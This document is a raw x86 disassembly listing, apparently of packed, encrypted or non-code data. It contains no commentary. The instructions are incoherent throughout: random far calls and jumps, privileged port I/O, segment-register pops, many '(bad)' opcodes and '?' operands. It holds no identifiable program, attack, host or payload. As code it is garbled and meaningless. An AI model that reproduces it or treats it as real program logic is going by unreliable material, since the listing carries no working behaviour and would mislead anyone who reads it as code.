  40e08f:	mov    dl,0x2c
  40e091:	pop    ss
  40e092:	pop    ds
  40e093:	in     eax,dx
  40e094:	fld    TBYTE PTR [ebx+0x11]
  40e097:	cmc    
  40e098:	pop    es
  40e099:	mov    edi,0x4a8e20af
  40e09e:	push   DWORD PTR [ebx]
  40e0a0:	mov    DWORD PTR [ecx],0x824082cf
  40e0a6:	lahf   
  40e0a7:	es xchg ebp,eax
  40e0a9:	sub    eax,0x9dc2884
  40e0ae:	in     al,0xcf
  40e0b0:	pop    ebp
  40e0b1:	jecxz  0x40e10d
  40e0b3:	pop    ss
  40e0b4:	cwde   
  40e0b5:	clc    
  40e0b6:	aad    0xe8
  40e0b8:	int    0xf9
  40e0ba:	cmp    BYTE PTR [ebp+0x608357af],dl
  40e0c0:	(bad)  [ebp+0xe]
  40e0c3:	jmp    0x91e6b111
  40e0c8:	and    BYTE PTR [eax],dl
  40e0ca:	push   esi
  40e0cb:	bound  esi,QWORD PTR [ebx]
  40e0cd:	pusha  
  40e0ce:	and    DWORD PTR [edx],edi
  40e0d0:	dec    ecx
  40e0d1:	jnp    0x40e057
  40e0d3:	jecxz  0x40e10b
  40e0d5:	dec    edx
  40e0d6:	test   DWORD PTR [ebx+eiz*2+0x1b26f3d0],edi
  40e0dd:	pop    ebp
  40e0de:	add    BYTE PTR [esi],cl
  40e0e0:	xor    esi,DWORD PTR [ecx+0x65938d09]
  40e0e6:	mov    al,0xbd
  40e0e8:	std    
  40e0e9:	sub    DWORD PTR ds:0xeca577d4,0x522914df
  40e0f3:	daa    
  40e0f4:	jmp    0x76fe50b6
  40e0f9:	dec    eax
  40e0fa:	dec    edx
  40e0fb:	fdivp  st(5),st
  40e0fd:	and    eax,0xa5f2c6b0
  40e102:	push   0xbb12c325
  40e107:	mov    ebx,DWORD PTR es:[ebp-0x4c219577]
  40e10e:	pop    esp
  40e10f:	or     ch,ch
  40e111:	sub    ah,ah
  40e113:	ins    DWORD PTR es:[edi],dx
  40e114:	out    dx,eax
  40e115:	or     DWORD PTR [edi],edi
  40e117:	fbstp  TBYTE PTR [ebx+0x74f507d2]
  40e11d:	jo     0x40e17c
  40e11f:	inc    esp
  40e120:	call   0x26836e4f
  40e125:	fucomp st(3)
  40e127:	in     eax,dx
  40e128:	sbb    ecx,DWORD PTR [ecx+edx*8-0x59]
  40e12c:	ficomp WORD PTR [ebp+edi*2+0x3c]
  40e130:	aad    0x51
  40e132:	sbb    DWORD PTR [ecx+0x69],esp
  40e135:	add    DWORD PTR [ebp-0x4f],0x17
  40e139:	fsubp  st(3),st
  40e13b:	stc    
  40e13c:	in     eax,0x6e
  40e13e:	int    0xeb
  40e140:	pop    es
  40e141:	pop    esp
  40e142:	loopne 0x40e1b0
  40e144:	in     al,dx
  40e145:	or     eax,0xf03c3479
  40e14a:	mov    al,0x4a
  40e14c:	les    edi,FWORD PTR [ebx-0x18]
  40e14f:	test   DWORD PTR [esi+0x5b],eax
  40e152:	jl     0x40e149
  40e154:	push   edx
  40e155:	add    dh,BYTE PTR [edi+0x27]
  40e158:	cmp    bl,BYTE PTR [esi]
  40e15a:	dec    ecx
  40e15b:	cmc    
  40e15c:	jae    0x40e1b1
  40e15e:	add    eax,0x50696bdc
  40e163:	mov    ah,0xe9
  40e165:	mov    eax,ds:0xc01fe9bf
  40e16a:	mov    WORD PTR [esi+eax*2],?
  40e16d:	lods   al,BYTE PTR ds:[esi]
  40e16e:	push   DWORD PTR [esp+eiz*4-0x4374f4cf]
  40e175:	sbb    bh,bh
  40e177:	pushf  
  40e178:	mov    bl,0xf0
  40e17a:	jo     0x40e13d
  40e17c:	mov    ecx,0x33971f33
  40e181:	ins    BYTE PTR es:[edi],dx
  40e182:	fst    DWORD PTR [edi+0x1154e349]
  40e188:	sbb    DWORD PTR [edx-0x59aec8b3],0xffffffff
  40e18f:	mov    bh,0x27
  40e191:	test   BYTE PTR [eax+0x22092550],bh
  40e197:	daa    
  40e198:	leave  
  40e199:	sbb    ah,0x1d
  40e19c:	inc    edx
  40e19d:	enter  0x3829,0xa8
  40e1a1:	push   eax
  40e1a2:	mov    ebx,0xb815b011
  40e1a7:	ret    0x2311
  40e1aa:	stc    
  40e1ab:	adc    eax,0xdcd88785
  40e1b0:	int3   
  40e1b1:	cs add eax,0x1c4cc4ea
  40e1b7:	pop    ss
  40e1b8:	das    
  40e1b9:	pushf  
  40e1ba:	loope  0x40e1f0
  40e1bc:	repnz mov al,ds:0xad5dd0b1
  40e1c2:	mov    edi,0x6e5f1db6
  40e1c7:	xchg   esp,eax
  40e1c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c9:	rcr    BYTE PTR [ebx],1
  40e1cb:	adc    eax,0x52ad0ebb
  40e1d0:	add    BYTE PTR [esi-0x19],dl
  40e1d3:	rcr    BYTE PTR [ebx+0x0],1
  40e1d6:	call   0xa6b1bdd6
  40e1db:	mov    WORD PTR [edx-0x33a79395],fs
  40e1e1:	loop   0x40e16e
  40e1e3:	cmc    
  40e1e4:	jbe    0x40e1b7
  40e1e6:	jnp    0x40e1d3
  40e1e8:	xchg   edx,eax
  40e1e9:	push   cs
  40e1ea:	fwait
  40e1eb:	pushf  
  40e1ec:	pop    esp
  40e1ed:	lahf   
  40e1ee:	push   es
  40e1ef:	or     al,0x35
  40e1f1:	sub    BYTE PTR [edx],dh
  40e1f3:	pop    esp
  40e1f4:	jmp    0x426422a2
  40e1f9:	cmp    al,0xa0
  40e1fb:	jbe    0x40e1ca
  40e1fd:	pusha  
  40e1fe:	jno    0x40e24d
  40e200:	jo     0x40e1bd
  40e202:	sbb    DWORD PTR [ecx+0x15],edi
  40e205:	enter  0x2893,0xbf
  40e209:	sti    
  40e20a:	outs   dx,DWORD PTR ds:[esi]
  40e20b:	sahf   
  40e20c:	repnz xor DWORD PTR [edi-0x29679209],0x2d
  40e214:	call   0x656:0x51396050
  40e21b:	stos   BYTE PTR es:[edi],al
  40e21c:	lahf   
  40e21d:	sahf   
  40e21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e21f:	xchg   ecx,eax
  40e220:	push   esi
  40e221:	pop    eax
  40e222:	aad    0x66
  40e224:	sbb    BYTE PTR [edx],bl
  40e226:	xlat   BYTE PTR ds:[ebx]
  40e227:	fimul  DWORD PTR [esi+0x36c216a9]
  40e22d:	fisub  DWORD PTR [ecx+ebp*4]
  40e230:	daa    
  40e231:	jns    0x40e1c3
  40e233:	mov    dh,0x94
  40e235:	pop    edx
  40e236:	push   0xa4afad97
  40e23b:	push   0x5a
  40e23d:	js     0x40e1d8
  40e23f:	les    ecx,FWORD PTR [ebx]
  40e241:	jne    0x40e1f0
  40e243:	jl     0x40e1d5
  40e245:	inc    ebp
  40e246:	mov    ebp,DWORD PTR [eax+0x1c]
  40e249:	cdq    
  40e24a:	jmp    DWORD PTR [edx-0x38fcb1d3]
  40e250:	mov    bh,0x5c
  40e252:	ds js  0x40e265
  40e255:	mov    edx,0x5f90a3a3
  40e25a:	or     BYTE PTR [ebp-0x327100f6],bl
  40e260:	pop    es
  40e261:	lock push cs
  40e263:	stc    
  40e264:	pcmpeqd mm0,QWORD PTR [edx]
  40e267:	mov    al,ds:0x1cbd54db
  40e26c:	shl    BYTE PTR ds:0xb668a25,1
  40e272:	lods   al,BYTE PTR ds:[esi]
  40e273:	mov    bl,0x1e
  40e275:	ja     0x40e232
  40e277:	sub    edx,DWORD PTR [edx]
  40e279:	mov    ebp,0x7b6b2de
  40e27e:	aas    
  40e27f:	popa   
  40e280:	loop   0x40e208
  40e282:	jnp    0x40e295
  40e284:	call   0x82c46e76
  40e289:	call   0x4cc935e7
  40e28e:	mov    al,ds:0xe942feeb
  40e293:	sbb    ch,cl
  40e295:	out    dx,eax
  40e296:	push   cs
  40e297:	push   ss
  40e298:	mov    ebp,0x93209e57
  40e29d:	jle    0x40e31d
  40e29f:	fstp   QWORD PTR [edx]
  40e2a1:	es inc ebx
  40e2a3:	push   0xffffff91
  40e2a5:	stos   BYTE PTR es:[edi],al
  40e2a6:	xchg   cl,bl
  40e2a8:	clc    
  40e2a9:	sub    ecx,DWORD PTR ds:0x25b249dc
  40e2af:	cmp    BYTE PTR [ecx+ebp*1+0x110b648f],dh
  40e2b6:	jp     0x40e2bd
  40e2b8:	mov    ah,0x21
  40e2ba:	test   bl,bh
  40e2bc:	jnp    0x40e306
  40e2be:	jg     0x40e268
  40e2c0:	push   ds
  40e2c1:	test   dh,bh
  40e2c3:	mov    ah,0x40
  40e2c5:	push   edx
  40e2c6:	jmp    0x40e27b
  40e2c8:	sbb    bh,BYTE PTR [ebx]
  40e2ca:	mov    dl,0x50
  40e2cc:	add    eax,0xbffcd28d
  40e2d1:	stc    
  40e2d2:	rol    DWORD PTR [eax],cl
  40e2d4:	loop   0x40e311
  40e2d6:	xor    bh,0xa9
  40e2d9:	(bad)  
  40e2da:	adc    eax,0xf5414ca4
  40e2df:	sub    DWORD PTR [ebx+eax*8-0x117508fd],eax
  40e2e6:	push   esi
  40e2e7:	(bad)  
  40e2e8:	in     al,0x77
  40e2ea:	sbb    eax,0xe71a4a03
  40e2ef:	setl   BYTE PTR [eax+0x5a0c482c]
  40e2f6:	cmp    esi,DWORD PTR [edi]
  40e2f8:	and    bl,BYTE PTR [edi+ebp*4-0x62704e3f]
  40e2ff:	adc    ebx,DWORD PTR [ecx]
  40e301:	outs   dx,BYTE PTR gs:[esi]
  40e303:	cmovb  eax,DWORD PTR [ecx]
  40e306:	lds    eax,FWORD PTR [edi-0x21571f94]
  40e30c:	jo     0x40e2eb
  40e30e:	stc    
  40e30f:	dec    ecx
  40e310:	jno    0x40e298
  40e312:	inc    edx
  40e313:	ret    0x9ebe
  40e316:	ja     0x40e2b1
  40e318:	jbe    0x40e32f
  40e31a:	into   
  40e31b:	shl    ebx,cl
  40e31d:	xchg   ecx,eax
  40e31e:	fisub  WORD PTR [ebp+0x51ebed3e]
  40e324:	scas   al,BYTE PTR es:[edi]
  40e325:	out    0xfc,eax
  40e327:	sub    DWORD PTR [edi],0xf34a1a11
  40e32d:	add    al,0xcc
  40e32f:	mov    dh,0xfb
  40e331:	call   0x2da7:0xbc419844
  40e338:	push   cs
  40e339:	pop    ebp
  40e33a:	pop    ecx
  40e33b:	add    dl,BYTE PTR [edx]
  40e33d:	call   0xecf4:0x42fe769f
  40e344:	pop    ds
  40e345:	push   ss
  40e346:	(bad)  
  40e347:	cmp    bh,BYTE PTR [edx-0x656dd527]
  40e34d:	test   al,0x23
  40e34f:	shl    DWORD PTR [eax-0x4671e0b],0xdb
  40e356:	je     0x40e311
  40e358:	(bad)  
  40e359:	js     0x40e323
  40e35b:	jge    0x40e38c
  40e35d:	xlat   BYTE PTR ds:[ebx]
  40e35e:	or     BYTE PTR [ebx],ch
  40e360:	aaa    
  40e361:	jl     0x40e390
  40e363:	xor    al,0x9b
  40e365:	push   0xffffffd2
  40e367:	icebp  
  40e368:	das    
  40e369:	add    DWORD PTR [edx-0x50],esp
  40e36c:	loope  0x40e3a4
  40e36e:	pop    edx
  40e36f:	or     cl,BYTE PTR [ebp-0x41]
  40e372:	enter  0xc2fb,0xe4
  40e376:	sub    DWORD PTR [ebx],edx
  40e378:	inc    ecx
  40e379:	and    DWORD PTR [edx-0x39],ebx
  40e37c:	xchg   edi,eax
  40e37d:	loope  0x40e30b
  40e37f:	mov    ebp,0x663d02a8
  40e384:	pop    es
  40e385:	mov    cl,0x5d
  40e387:	outs   dx,DWORD PTR ds:[esi]
  40e388:	adc    BYTE PTR [edi+0x3a9ea92f],cl
  40e38e:	inc    ebp
  40e38f:	pop    esi
  40e390:	idiv   DWORD PTR [ebp-0x42]
  40e393:	push   edx
  40e394:	xchg   ebp,eax
  40e395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e396:	jo     0x40e3e2
  40e398:	pushf  
  40e399:	rcl    DWORD PTR [eax-0x5fa835ff],1
  40e39f:	jb     0x40e34c
  40e3a1:	frndint 
  40e3a3:	lods   al,BYTE PTR ds:[esi]
  40e3a4:	sahf   
  40e3a5:	inc    esp
  40e3a6:	lods   al,BYTE PTR ds:[esi]
  40e3a7:	out    0x86,al
  40e3a9:	popa   
  40e3aa:	out    0xdb,al
  40e3ac:	mov    cl,0x92
  40e3ae:	adc    ch,ah
  40e3b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3b1:	bound  esi,QWORD PTR [ebx]
  40e3b3:	adc    edx,DWORD PTR [eax]
  40e3b5:	mov    edx,0xc9d5800f
  40e3ba:	stc    
  40e3bb:	cld    
  40e3bc:	xlat   BYTE PTR ds:[ebx]
  40e3bd:	mov    edx,DWORD PTR [ecx]
  40e3bf:	jnp    0x40e3f1
  40e3c1:	jne    0x40e40c
  40e3c3:	jmp    0x40e3a9
  40e3c5:	push   ebx
  40e3c6:	cmp    edx,edi
  40e3c8:	xor    esi,DWORD PTR [ebx+eax*1]
  40e3cb:	idiv   BYTE PTR [edi]
  40e3cd:	cdq    
  40e3ce:	push   edi
  40e3cf:	mov    DWORD PTR [edx],ebx
  40e3d1:	xchg   DWORD PTR [eax],ebx
  40e3d3:	outs   dx,BYTE PTR ds:[esi]
  40e3d4:	xor    dl,BYTE PTR [ecx+eiz*2+0x4]
  40e3d8:	jnp    0x40e380
  40e3da:	cmp    eax,0x48f0a3c8
  40e3df:	mov    cs:0xf9c9d6b8,al
  40e3e5:	mov    al,0xb1
  40e3e7:	and    BYTE PTR [edx-0x785b3a6e],al
  40e3ed:	and    esi,edx
  40e3ef:	pop    esi
  40e3f0:	cmp    DWORD PTR [ecx],0x4
  40e3f3:	retf   0x72be
  40e3f6:	aad    0x15
  40e3f8:	mov    ds:0x1747d24d,eax
  40e3fd:	xchg   ecx,eax
  40e3fe:	test   al,0x2a
  40e400:	sbb    dl,BYTE PTR [eax-0x80]
  40e403:	push   eax
  40e404:	pop    eax
  40e405:	xchg   ebx,eax
  40e406:	cmp    eax,ebp
  40e408:	call   0xc461c30b
  40e40d:	and    al,0xcf
  40e40f:	jno    0x40e3ff
  40e411:	sub    cl,BYTE PTR es:[ebx+eiz*2]
  40e415:	xchg   esi,eax
  40e416:	xor    edi,ebp
  40e418:	shl    DWORD PTR [esp+ecx*8+0x2a8b84c2],1
  40e41f:	adc    edi,DWORD PTR [eax-0x35]
  40e422:	popa   
  40e423:	scas   eax,DWORD PTR es:[edi]
  40e424:	xchg   BYTE PTR [ecx],cl
  40e426:	pop    edi
  40e427:	pop    es
  40e428:	xchg   edx,eax
  40e429:	das    
  40e42a:	stc    
  40e42b:	jmp    0x7a8e:0x3601adfa
  40e432:	xor    ebp,esi
  40e434:	sahf   
  40e435:	xchg   esp,eax
  40e436:	into   
  40e437:	xabort 0x7e
  40e43a:	or     edx,0xdfef662a
  40e440:	cmp    dh,dl
  40e442:	lock dec esp
  40e444:	lea    edx,[esi+0x2f]
  40e447:	int    0x87
  40e449:	rcl    BYTE PTR [edx+0x69972837],0xc1
  40e450:	inc    ebp
  40e451:	fidiv  WORD PTR [ecx+eax*8+0x70]
  40e455:	xchg   ebx,eax
  40e456:	xchg   edx,eax
  40e457:	sbb    DWORD PTR [eax-0x4095b31f],ecx
  40e45d:	jg     0x40e46d
  40e45f:	sub    eax,0xc1c5c812
  40e464:	mov    eax,ds:0xde2fe5c0
  40e469:	xor    al,0x86
  40e46b:	adc    bh,BYTE PTR [ecx]
  40e46d:	js     0x40e4ca
  40e46f:	mov    BYTE PTR [ebx+0x5cae635c],dl
  40e475:	sub    BYTE PTR [edi],bl
  40e477:	in     eax,dx
  40e478:	leave  
  40e479:	and    eax,DWORD PTR [edi-0x1]
  40e47c:	cmp    ebp,DWORD PTR [edx-0x12]
  40e47f:	shl    BYTE PTR [ecx],1
  40e481:	bswap  ecx
  40e483:	sub    eax,0x8209940e
  40e488:	sbb    bl,bh
  40e48a:	pusha  
  40e48b:	mov    edx,0x437aa63f
  40e490:	xchg   edx,eax
  40e491:	add    al,0x72
  40e493:	sub    esp,eax
  40e495:	call   0xf0a7:0x792ed2c2
  40e49c:	and    al,al
  40e49e:	push   ss
  40e49f:	(bad)  
  40e4a0:	push   ds
  40e4a1:	dec    esp
  40e4a2:	pushf  
  40e4a3:	scas   eax,DWORD PTR es:[edi]
  40e4a4:	adc    cl,cl
  40e4a6:	in     eax,dx
  40e4a7:	or     al,0x34
  40e4a9:	test   eax,0x2db020a1
  40e4ae:	mov    ah,0x7b
  40e4b0:	aaa    
  40e4b1:	sub    BYTE PTR [esi-0x4dfb630b],al
  40e4b7:	pop    ebx
  40e4b8:	in     al,dx
  40e4b9:	push   edx
  40e4ba:	xor    cl,BYTE PTR [eax-0x5bac8e14]
  40e4c0:	add    BYTE PTR [ebx-0x5cf2894e],dl
  40e4c6:	fiadd  DWORD PTR [ebp-0x7b77b591]
  40e4cc:	mov    ch,0x9b
  40e4ce:	icebp  
  40e4cf:	ins    DWORD PTR es:[edi],dx
  40e4d0:	jp     0x40e4cb
  40e4d2:	pop    es
  40e4d3:	dec    ebp
  40e4d4:	xchg   edi,eax
  40e4d5:	inc    esp
  40e4d6:	add    dh,BYTE PTR [edx+0x16330bb4]
  40e4dc:	jo     0x40e490
  40e4de:	or     al,0xd5
  40e4e0:	dec    ebp
  40e4e1:	mov    edi,0x1bd697bb
  40e4e6:	pusha  
  40e4e7:	pop    esi
  40e4e8:	mov    bl,0xdf
  40e4ea:	pushf  
  40e4eb:	shl    BYTE PTR [edi+0x1b02a84b],0x9f
  40e4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4f3:	push   0xec4889e
  40e4f8:	ja     0x40e484
  40e4fa:	(bad)
  40e4fe:	cs (bad) 
  40e500:	jl     0x40e4ee
  40e502:	xchg   ebx,eax
  40e503:	lds    esp,FWORD PTR [ebx+0x11ce331b]
  40e509:	sub    eax,0xf5568c6
  40e50e:	(bad)  [esi+0x257121e9]
  40e514:	sub    al,0x26
  40e516:	xor    edx,eax
  40e518:	test   esp,0x182dd47d
  40e51e:	repz xor bl,BYTE PTR [edx-0x10]
  40e522:	push   esp
  40e523:	fdiv   DWORD PTR [ebx]
  40e525:	adc    esp,DWORD PTR [ebx-0x6a44d131]
  40e52b:	ins    DWORD PTR es:[edi],dx
  40e52c:	mov    dl,BYTE PTR [ebp-0x66]
  40e52f:	lds    esi,FWORD PTR [esi+0x3b5c2b7c]
  40e535:	xchg   esi,eax
  40e536:	stc    
  40e537:	jae    0x40e5a8
  40e539:	clc    
  40e53a:	icebp  
  40e53b:	test   BYTE PTR [eax],0x1
  40e53e:	mov    cl,0xf5
  40e540:	mov    edx,0xd6dd9737
  40e545:	jb     0x40e52b
  40e547:	mov    al,0x57
  40e549:	outs   dx,BYTE PTR ds:[esi]
  40e54a:	mov    ds:0xa8a8df02,al
  40e54f:	mov    al,0x84
  40e551:	pop    esp
  40e552:	repnz cmp al,0xc3
  40e555:	push   edx
  40e556:	mov    dh,0xf4
  40e558:	lds    edi,FWORD PTR [ebx+eiz*2+0x75]
  40e55c:	pop    eax
  40e55d:	xchg   BYTE PTR es:[ecx+ecx*8],al
  40e561:	jb     0x40e4ff
  40e563:	arpl   WORD PTR [edi-0x66],bp
  40e566:	xor    eax,0x24eb71c3
  40e56b:	mov    ds:0xf65ff1a6,eax
  40e570:	les    edx,FWORD PTR [ebx]
  40e572:	mov    WORD PTR [ebx],gs
  40e574:	test   DWORD PTR ds:0x1cabd32b,esi
  40e57a:	push   ecx
  40e57b:	mov    esp,0xfe54e08d
  40e580:	mov    bh,0x1c
  40e582:	lea    ebp,[ecx+0x2]
  40e585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e586:	div    DWORD PTR [ecx]
  40e588:	xchg   ebx,eax
  40e589:	inc    edx
  40e58a:	xor    bl,bh
  40e58c:	xor    eax,DWORD PTR [ebp+0x21]
  40e58f:	ja     0x40e513
  40e591:	and    al,0x75
  40e593:	fmul   QWORD PTR [esi-0x7f]
  40e596:	pop    edx
  40e597:	sub    eax,0xda5d4cd3
  40e59c:	mov    esi,0xaa991f53
  40e5a1:	scas   eax,DWORD PTR es:[edi]
  40e5a2:	fidiv  WORD PTR [eax]
  40e5a4:	or     eax,0xd40febdc
  40e5a9:	push   edx
  40e5aa:	sub    edi,DWORD PTR [ecx]
  40e5ac:	(bad)  
  40e5ad:	cmp    ch,BYTE PTR [ecx]
  40e5af:	outs   dx,BYTE PTR ds:[esi]
  40e5b0:	or     ecx,DWORD PTR ds:0xc24c16a1
  40e5b6:	clc    
  40e5b7:	add    ah,dh
  40e5b9:	push   edx
  40e5ba:	mov    ebp,DWORD PTR [ebx+0x78]
  40e5bd:	dec    ecx
  40e5be:	jnp    0x40e566
  40e5c0:	icebp  
  40e5c1:	mov    eax,0xa0fb519e
  40e5c6:	push   0xab27654a
  40e5cb:	jg     0x40e55b
  40e5cd:	aam    0x7c
  40e5cf:	mov    al,0x86
  40e5d1:	mov    eax,ds:0x895907fe
  40e5d6:	es mov al,0x20
  40e5d9:	dec    ecx
  40e5da:	in     al,dx
  40e5db:	xchg   edx,eax
  40e5dc:	xchg   ebp,eax
  40e5dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5de:	imul   ecx,DWORD PTR [ebx+0x7e87c11e],0xffffffa3
  40e5e5:	sub    dl,BYTE PTR [ecx-0xc1bec46]
  40e5eb:	xchg   ecx,eax
  40e5ec:	sbb    DWORD PTR [edx-0x310892e5],0x4b
  40e5f3:	int    0x61
  40e5f5:	loop   0x40e634
  40e5f7:	dec    ecx
  40e5f8:	push   cs
  40e5f9:	jno    0x40e5d1
  40e5fb:	scas   eax,DWORD PTR es:[edi]
  40e5fc:	gs sub bh,dh
  40e5ff:	dec    eax
  40e600:	push   edi
  40e601:	mov    edi,0x7b0e7c3a
  40e606:	jmp    0x40e5d7
  40e608:	xchg   ebx,eax
  40e609:	pop    edi
  40e60a:	xor    BYTE PTR [edi+0x9f73195],0xc2
  40e611:	sar    DWORD PTR [eax],0xe3
  40e614:	pop    es
  40e615:	fwait
  40e616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e617:	aas    
  40e618:	mov    esp,ebx
  40e61a:	and    eax,0xe55eea74
  40e61f:	js     0x40e60e
  40e621:	mov    DWORD PTR [eax],0xdf96a9ab
  40e627:	fstp   DWORD PTR [edx+0x37996f19]
  40e62d:	push   ecx
  40e62e:	sar    DWORD PTR [ecx+0x46],0x75
  40e632:	mov    eax,0xf7fd3250
  40e637:	in     al,dx
  40e638:	test   al,0xa5
  40e63a:	inc    edx
  40e63b:	and    DWORD PTR [edi],edx
  40e63d:	or     esp,DWORD PTR [esi+0x1]
  40e640:	dec    ebp
  40e641:	adc    al,0x9e
  40e643:	in     eax,dx
  40e644:	push   cs
  40e645:	dec    eax
  40e646:	adc    esp,DWORD PTR [eax]
  40e648:	xchg   ebp,eax
  40e649:	mov    dh,0x95
  40e64b:	push   ss
  40e64c:	mov    ?,WORD PTR cs:[edx-0x5a]
  40e650:	mov    ah,0x17
  40e652:	not    DWORD PTR [edx+edi*2+0x53c7e49f]
  40e659:	stos   DWORD PTR es:[edi],eax
  40e65a:	in     eax,dx
  40e65b:	aam    0x69
  40e65d:	add    cl,BYTE PTR [esi]
  40e65f:	sbb    eax,0xc20eab6a
  40e664:	jno    0x40e665
  40e666:	jl     0x40e686
  40e668:	add    eax,DWORD PTR [ebp-0x44]
  40e66b:	cs ret 0x5bfa
  40e66f:	mov    al,0x4a
  40e671:	or     DWORD PTR [ecx],0x55
  40e674:	adc    cl,BYTE PTR [ebx-0x1a403f41]
  40e67a:	test   DWORD PTR [esi+ebp*1-0x52],ebx
  40e67e:	dec    ebx
  40e67f:	(bad)  
  40e680:	xor    DWORD PTR [edx-0x5c],ecx
  40e683:	(bad)  
  40e684:	xchg   edx,eax
  40e685:	mov    ds:0x75d0c177,eax
  40e68a:	mov    bl,0x2
  40e68c:	lods   eax,DWORD PTR ds:[esi]
  40e68d:	jge    0x40e6a6
  40e68f:	pop    ds
  40e690:	mov    esi,0xf5225f7a
  40e695:	add    al,0x9f
  40e697:	push   eax
  40e698:	imul   eax,DWORD PTR [edx],0xa203c8ff
  40e69e:	pop    ebx
  40e69f:	cmp    edi,DWORD PTR [esi-0x26]
  40e6a2:	cmp    BYTE PTR [edi],ch
  40e6a4:	ret    0x5204
  40e6a7:	sbb    eax,0x3eb26d36
  40e6ac:	(bad)  
  40e6ad:	sub    eax,0xc863bc1d
  40e6b2:	cmovp  esp,esp
  40e6b5:	add    eax,0x76ec4304
  40e6ba:	pop    esp
  40e6bb:	pop    DWORD PTR [ecx+0x54fa0310]
  40e6c1:	mov    DWORD PTR [ebx-0x6c],eax
  40e6c4:	jecxz  0x40e6e9
  40e6c6:	xor    cl,BYTE PTR [esi]
  40e6c8:	adc    cl,bl
  40e6ca:	daa    
  40e6cb:	and    esi,DWORD PTR [ecx+ebx*1+0x74748573]
  40e6d2:	js     0x40e6f7
  40e6d4:	push   bx
  40e6d6:	test   edx,ebp
  40e6d8:	mov    ecx,?
  40e6da:	stc    
  40e6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6dc:	mov    al,0xcb
  40e6de:	dec    ebp
  40e6df:	mov    eax,0xccd6c75
  40e6e4:	mov    edx,0xccdd155c
  40e6e9:	jle    0x40e691
  40e6eb:	cmp    eax,0x157226e1
  40e6f0:	fs scas eax,DWORD PTR es:[edi]
  40e6f2:	out    0x92,eax
  40e6f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6f5:	sahf   
  40e6f6:	sti    
  40e6f7:	faddp  st(2),st
  40e6f9:	jb     0x40e715
  40e6fb:	ins    BYTE PTR es:[edi],dx
  40e6fc:	sbb    BYTE PTR [edi],cl
  40e6fe:	fidiv  DWORD PTR [ecx]
  40e700:	pop    es
  40e701:	pusha  
  40e702:	loopne 0x40e6df
  40e704:	sbb    al,0xb7
  40e706:	jmp    0x818d8d16
  40e70b:	mov    al,0x13
  40e70d:	je     0x40e6e0
  40e70f:	ds cwde 
  40e711:	jle    0x40e6e6
  40e713:	cwde   
  40e714:	cld    
  40e715:	fidivr DWORD PTR [ebx]
  40e717:	sub    ch,dh
  40e719:	mov    DWORD PTR [ebp+0x49],esp
  40e71c:	cld    
  40e71d:	xchg   edx,eax
  40e71e:	test   al,0xce
  40e720:	sub    DWORD PTR [edi+0x4483b902],ebp
  40e726:	ja     0x40e733
  40e728:	out    dx,al
  40e729:	pop    es
  40e72a:	call   0x7d4f:0x6978eda7
  40e731:	sub    BYTE PTR [edi],ah
  40e733:	inc    eax
  40e734:	mov    ebp,0xff602e77
  40e739:	into   
  40e73a:	push   cs
  40e73b:	mov    esp,fs
  40e73d:	adc    esi,ebx
  40e73f:	xchg   ebp,eax
  40e740:	sar    BYTE PTR [ecx+0xb],cl
  40e743:	or     ch,BYTE PTR [edx-0x5e]
  40e746:	xor    al,0xd
  40e748:	xchg   edx,eax
  40e749:	xchg   esi,eax
  40e74a:	scas   al,BYTE PTR es:[edi]
  40e74b:	outs   dx,DWORD PTR ds:[esi]
  40e74c:	fbld   TBYTE PTR [ebp+0x4ab6c8d7]
  40e752:	jmp    0x40e6d5
  40e754:	js     0x40e7d2
  40e756:	pusha  
  40e757:	or     BYTE PTR [edx-0x7b],ah
  40e75a:	jbe    0x40e7d4
  40e75c:	fwait
  40e75d:	ja     0x40e709
  40e75f:	out    0xc3,eax
  40e761:	cmp    al,BYTE PTR [edi-0x5474da87]
  40e767:	in     al,dx
  40e768:	mov    cl,BYTE PTR [ebp-0x40]
  40e76b:	xor    al,0x43
  40e76d:	cli    
  40e76e:	imul   ebx,DWORD PTR [edi+0x77],0xffffff9f
  40e772:	loop   0x40e763
  40e774:	int3   
  40e775:	mov    dl,0x65
  40e777:	icebp  
  40e778:	idiv   BYTE PTR [edx-0x79]
  40e77b:	(bad)  
  40e77c:	sahf   
  40e77d:	cmp    DWORD PTR [ebx],esi
  40e77f:	ins    BYTE PTR es:[edi],dx
  40e780:	push   0x6e
  40e782:	imul   edx,edx,0x1d948cbd
  40e788:	xchg   edx,eax
  40e789:	fs hlt 
  40e78b:	fisttp QWORD PTR [ecx+0x78]
  40e78e:	std    
  40e78f:	xor    eax,esi
  40e791:	mov    WORD PTR [edx-0x7dd7c5d6],ss
  40e797:	lds    esi,FWORD PTR ds:0xdd301614
  40e79d:	fbld   TBYTE PTR [edi+0x23]
  40e7a0:	xchg   esp,eax
  40e7a1:	xchg   esi,eax
  40e7a2:	popf   
  40e7a3:	inc    eax
  40e7a4:	or     ebp,DWORD PTR [ecx]
  40e7a6:	xor    ebx,DWORD PTR [esp+ebp*8]
  40e7a9:	jg     0x40e810
  40e7ab:	imul   edi,DWORD PTR ds:0xa1481215,0x8831a1f1
  40e7b5:	xchg   esp,eax
  40e7b6:	xchg   ebx,eax
  40e7b7:	inc    ebx
  40e7b8:	not    DWORD PTR [edi+0x4a]
  40e7bb:	mov    eax,0xe1317250
  40e7c0:	cmp    DWORD PTR [edi],esp
  40e7c2:	das    
  40e7c3:	cmp    al,0xf0
  40e7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7c6:	jnp    0x40e77e
  40e7c8:	or     al,0xe7
  40e7ca:	sub    al,ch
  40e7cc:	ds stc 
  40e7ce:	pop    esp
  40e7cf:	sahf   
  40e7d0:	pushf  
  40e7d1:	or     al,0xbf
  40e7d3:	xchg   esp,eax
  40e7d4:	dec    edi
  40e7d5:	cmp    al,0x44
  40e7d7:	pop    esp
  40e7d8:	call   0x9915f639
  40e7dd:	fisub  WORD PTR [edi-0x2c]
  40e7e0:	das    
